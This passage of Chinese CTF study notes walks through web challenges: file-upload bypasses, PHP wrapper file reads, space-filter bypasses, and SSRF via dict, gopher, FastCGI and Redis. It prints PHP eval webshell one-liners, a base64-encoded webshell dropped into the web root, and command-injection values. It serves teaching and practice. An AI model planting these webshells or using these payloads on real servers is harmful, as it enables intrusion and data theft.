.swn</code><br>此题使用终端命令<code>vim -r index.php.swp</code>恢复原文件即可</p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。<br>利用工具dsstore:<code>python3 main.py .DS_Store</code>导出一个文本文件</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="https://www.secpulse.com/archives/95987.html">文件上传常见姿势</a></p><h4 id="js前端验证"><a href="#js前端验证" class="headerlink" title="js前端验证"></a>js前端验证</h4><p>写一个一句话木马 查看源码可知只允许上传图片格式<br>更改文件后缀名 抓包后改回后缀 上传后连接蚁剑<br>也可以直接禁用js直接上�</p><p>DVWA中级文件上传则是通过Content-Type在服务端MIME检测</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h4><p>修改Content-Type为image/jpeg、image/png、image/gif</p><h4 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h4><p>百度百科：<img src="https://img-blog.csdnimg.cn/20210223002229696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>利用条件</p><ul><li><p><input checked="" disabled="" type="checkbox">  apache服务器</p></li><li><p><input checked="" disabled="" type="checkbox">  能够上传.htaccess文件，一般为黑名单限制。</p></li><li><p><input checked="" disabled="" type="checkbox">  AllowOverride All，默认配置为关闭None。</p></li><li><p><input checked="" disabled="" type="checkbox">  上传目录具有可执行权限LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</p></li></ul><p>写一个<code>.htaccess</code>文件：</p><ul><li>正则匹配名为test的文件 当作php文件解析 ：</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test&quot;</span>&gt;</span><br> <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>或：</p><ul><li>以php解析.htaccess文件所在目录及其子目录中的后缀为.xxx的文件文件</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php xxx<br><br>(AddHandler php5-<span class="hljs-keyword">script</span> php)<br></code></pre></td></tr></table></figure><p>然后直接一句话以php解析.htaccess文件所在目录及其子目录中的所有文件 上传一个test.jpg的一句话木马，然后连接蚁剑即可</p><h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h4><p>上面的是对apache起作用的，而这个是对以fastcgi运行的php起作用的，不管他的服务器是nginx/apache/IIS，范围更广</p><p>php.ini是php的配置文件，通常下载下来的php都没有这个文件，有两个预置的ini模板，php.ini-development和php.ini-production,前者是开发环境推荐的，允许调试，少占资源；后者是上线产品时的环境推荐，禁止报错，提高性能</p><p>php.ini包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 ini 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。在 <code>.user.ini</code> 风格的 ini 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 ini 设置可被识别</p><p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png"></p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载，然后我们看到php.ini中的配置项，但是只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”，其中有两个可以利用的配置点</p><p>auto_append_file和auto_prepend_file</p><p>前者是文件包含在要执行的文件后，后者是自动包含在要执行的文件前</p><p>在.user.ini写入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auto_prepend_file=xxx.jpg<span class="hljs-regexp">/png/gi</span>f<br></code></pre></td></tr></table></figure><p>然后上传一个一句话图片马</p><p>buu一道题为例 buu suctf CheckIn</p><p>上传.user.ini后上传一个图片 抓包改包</p><p>此题检测<code>&lt;?</code>需要对一句话进行变形具体见一句话的变形</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210606161438091.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210606161521279.png"></p><p><strong>00截断</strong><br>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。%00和0x00,后台读取是遇到%00就会停止。举个例子，url中输入的是upload/post.php%00.jpg，那么后台读取到是upload/post.php，就实现了绕后目的。<br>00截断的限制条件：PHP&lt;5.3.29，且GPC关闭<br><strong>注意：00截断是在url的地方实现的</strong></p><p><img src="https://img-blog.csdnimg.cn/2021022323070732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>传图片马 burp抓包 改post后面的url<br><img src="https://img-blog.csdnimg.cn/20210223232427937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>蚁剑连接时注意修改url</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><strong>php://input</strong><br>利用php伪协议 <a href="https://segmentfault.com/a/1190000018991087">滚去看啦:PHP伪协议总结</a><br><img src="https://img-blog.csdnimg.cn/20210302113044978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>在hackbar内写<code>/?php://input</code>后POST传参<code>&lt;?php system(&#39;&#39;);?&gt;</code>得到flag<br><strong>远程包含</strong><br>此题也可以利用伪协议解开 但此题考查的是个人vps的利用 待补<br><strong>读取源代码</strong><br>利用伪协议中的<code>php://filter</code><br>构造url<code>/?php://filter/read=convert.base64-encode/resource=/flag</code></p><p>关于php一句话：<br>如果在浏览器传参，使用””包裹php一句话，并且echo &gt;*.php的方式写入时时，则需要注意对$的转义，避免此类情况的发生，建议使用’’”包裹一句话</p><p>在windows下利用cmd的echo &gt;*.php 需要对尖括号进行转义（不必加引号包裹），即：<br><code>^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt;</code></p><p>在linux下echo &gt;*.php：<br><code>&quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot;</code><br><code>&quot;&lt;?php @eval(\$_POST[\&quot;pass\&quot;]);?&gt;&quot;</code><br><code>&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;</code><br><code>&#39;&lt;?php @eval($_POST[\&#39;pass\&#39;]);?&gt;&#39;</code></p><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p><code>$&#123;IFS&#125;</code><br><code>$IFS$9</code><br><code>&lt;</code><br><code>&lt;&gt;</code><br><code>&#123;,&#125;</code><br>等可以代替空格<br>此题注释掉了答案而不回显 空格绕过后查看页面源码即可</p><h2 id="综合绕过"><a href="#综合绕过" class="headerlink" title="综合绕过"></a>综合绕过</h2><p>利用编码表打出组合拳<br><img src="https://img-blog.csdnimg.cn/20210313110431187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>读取Web目录下的flag.php 考了个常识，web目录在：<code>var/www/html</code><br>直接用读取文件的伪协议:<code>file:///var/www/html</code></p><h2 id="在线扫描端口"><a href="#在线扫描端口" class="headerlink" title="在线扫描端口"></a>在线扫描端口</h2><p>这里熟悉一个协议：<br>dict协议(2628)：<a href="http://www.dict.org是一个线上的字典查询网站(真就查单词的)/">www.dict.org是一个线上的字典查询网站(真就查单词的)</a> 能想到用这个协议来探测端口的也是人才<br>原理：（待补）<br>可以在命令行里连接玩一下 telnet ip 2628<br>help 查看帮助<br>define * (要查询的单词)<br><img src="https://img-blog.csdnimg.cn/20210313170807589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>好了 这是官方文档中dict://语法</p><p><img src="https://img-blog.csdnimg.cn/20210313170835224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>首先在地址栏构造<code>?url=dict://127.0.0.1:8000</code><br>由于dict://协议是一条一条执行的 需要让浏览器逐个访问8<del>9K的端口<br>从字典爆破的角度考虑，那么抓包，放到intruder，将端口标记，爆破模式选择number，设置8</del>9K的范围，爆破完毕，倒叙查看长度，payload为8057，回到浏览器访问该端口即可<br><img src="https://img-blog.csdnimg.cn/20210313171505715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171540971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171710798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">插一句，也可以直接访问127.0.0.1加端口再挂burp爆破</p><p><img src="https://img-blog.csdnimg.cn/20210314180743119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这里的题目开始难度跨越很厉害了 得去学习一些涉及到的协议了</p><p>首先，什么是<code>gopher协议</code><img src="https://img-blog.csdnimg.cn/20210320203305300.png"></p><blockquote><p>Gopher是Internet上一个非常有名的信息查找系统，由明尼苏达大学设计，并以该校的运动队“金色地鼠”（俚语：“去找”）来命名。在时间上，比Internet还要早几年。它只支持文本，不支持图像。该协议将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。允许用户使用层叠结构的菜单与文件，以发现和检索信息，Gopher客户程序和Gopher服务器相连接，并能使用菜单结构显示其它的菜单、文档或文件，并索引。同时可通过Telnet远程访问其它应用程序。Gopher协议使得Internet上的所有Gopher客户程序，能够与Internet上的所有已“注册”的Gopher服务器进行对话。<br>Gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求：gopher协议支持发出GET、POST请求，先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）<br>在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它</p></blockquote><p><strong><code>gopher协议没有默认端口，所以需要指定web端口，而且需要指定POST方法。回车换行使用%0D%0A替换%0A,POST参数之间的&amp;分隔符也要进行url编� �</code></strong></p><p>因此 为了使用gopher协议进行攻击 就必须将<code>&amp;</code>进行url编码（第一次） 而gopher协议将上面第一次的字符串传进服务器时 url解码（一次） 此时又会出现字符<code>&amp;</code> 而此时的url里gopher并不认可即将继续跳转的地址（含有未转码的&amp;） 因此我们要让第一次的<code>&amp;</code>转码<code>%26</code>再次转码为<code>%2526</code> 最后需要将上面的内容装进gopher协议里 所以进行最后一次转码 放进url里</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">ssrf对gopher协议的利用</a></p><ul><li>做题步骤</li></ul><p>dirsearch -&gt; 利用php伪协议file://访问一下 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-variable">$flag</span>=getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br><span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>&gt;<br>&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;<br>&lt;/form&gt;<br><br><span class="hljs-comment">//要求访问的远程地址必须为127.0.0.1(相当于实战中必须让远程目标主机本地访问)</span><br></code></pre></td></tr></table></figure><p>前端访问一下flag.php，查看源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span> /&gt;</span><br>  <span class="hljs-comment">&lt;!-- De<span class="hljs-doctag">bug:</span> key=399be68d73e23ae8f326b4850128f33c--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用post的方式把key传进flag.php -&gt; 构造带key的POST包 抓包重放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /flag.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: curl<br>Accept: */*<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 36<br><br>key=---<br>#注意此处的Content-Length要与POST内容长度一致<br>#上面的整个POST包进行url编码<br>#将得到的编码中的所有%0A(数字0) 替换为%0D%0A (%0A为换行符——另起一新行，光标在新行的开头；%0D为回车——光标回到旧行(光标当前所在的行)的开头<br>#再将上面得到的编码再一次编码！<br></code></pre></td></tr></table></figure><p>将上面得到的拼接<strong>gopher协议</strong>重放即可 <img src="https://img-blog.csdnimg.cn/20210314175949642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><a href="https://blog.csdn.net/weixin_46203060/article/details/109548606?spm=1001.2014.3001.5501">wp参考博客</a></p><h2 id="文件上传-SSRF"><a href="#文件上传-SSRF" class="headerlink" title="文件上传(SSRF)"></a>文件上传(SSRF)</h2><p>同上一题查看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Upload Webshell：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>  <span class="hljs-comment">&lt;!-- 这里在html表单里再加一行file换成submit 增加一个文件上传的按钮 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传一个文件 抓包改包和上一题差不多 但不需要构造post包</p><h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">typedef struct &#123;<br>  /* Header */<br>  unsigned char version; // 版本<br>  unsigned char type; // 本次record的类型<br>  unsigned char requestIdB1; // 本次record对应的请求id<br>  unsigned char requestIdB0;<br>  unsigned char contentLengthB1; // body体的大小<br>  unsigned char contentLengthB0;<br>  unsigned char paddingLength; // 额外块大小<br>  unsigned char reserved;<br><br>  /* Body */<br>  unsigned char contentData[contentLength];<br>  unsigned char paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p><p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p><p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p><ul><li>做题</li></ul><p>利用Gopherus生成payload</p><blockquote><p>已知存在的文件/var/www/html/index.php</p><p><strong>base64(<?php @eval($_POST['pass']);?>)=PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</strong></p><p>要执行的命令echo <code>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</code>|base64 -d &gt;/var/www/html/shell.php</p></blockquote><p>同上转码两次即可</p><h2 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h2><p>开放端口6379</p><p>Gopherus生成payload 进行两次转码 然后就在get传参cmd=ls…… 貌似要绕过空格</p><p><img src="https://img-blog.csdnimg.cn/20210423214036185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70#pic_center"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=ls<span class="hljs-variable">$&#123;IFS&#125;</span>/<br><span class="hljs-attr">cmd</span>=cat<span class="hljs-variable">$&#123;IFS&#125;</span>/flag<br></code></pre></td></tr></table></figure><p>不利用该脚本 自己写一个redis协议 写进一句话也可以 Gopherus生成的payload必须是cmd传参</p><h2 id="Training-Rebots"><a href="#Training-Rebots" class="headerlink" title="Training-Rebots"></a>Training-Rebots</h2><p>访问一下rebots.txt文件 根据允许和不允许抓包改包即可</p><h2 id="Can-you-anthenticate-to-this-website"><a href="#Can-you-anthenticate-to-this-website" class="headerlink" title="Can you anthenticate to this website?"></a>Can you anthenticate to this website?</h2><p>首先可以dirsearch扫一下要干什么<br><img src="https://img-blog.csdnimg.cn/20210317212908628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>很明显是登陆操作了<br>我们没办法盲目地登录 必须查看到登录源码才能进去，这里总结一下如何查看源码</p><p><strong>对网页源码的查看方法</strong></p><ol><li><p> 审查元素的方式 右击或者F12</p></li><li><p> 右击查看页面源代码或者url开头写<code>view-source:</code>也可以ctrl+u</p></li><li><p> phps文件类型主要由php组与php源关联。通常，php文件将由web服务器和php可执行文件解释(在服务器注册过的MIME类型的文件)，网站访问者看不到php文件代码。如果将文件扩展名设为.phps，服务器配置正确 将会输出源代码的彩色格式版本，而不是生成的HTML。</p></li><li><p>利用php伪协议<code>php://filter</code><br> 那么此题的就是用到<code>.phps</code>解开此题<br> 上面dirsearch并未发现这个文件 是脚本爆破的问题 可以向字典里面添加规则 在dirsearch/db下的dicc.txt 在index.php下添加一条index.phps即可<br> <img src="https://img-blog.csdnimg.cn/20210317221647640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br> 查看源码：<img src="https://img-blog.csdnimg.cn/20210317221810408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">发现里边首先url解码GET得到的字符串 松散比较等于<code>&quot;admin&quot;</code> 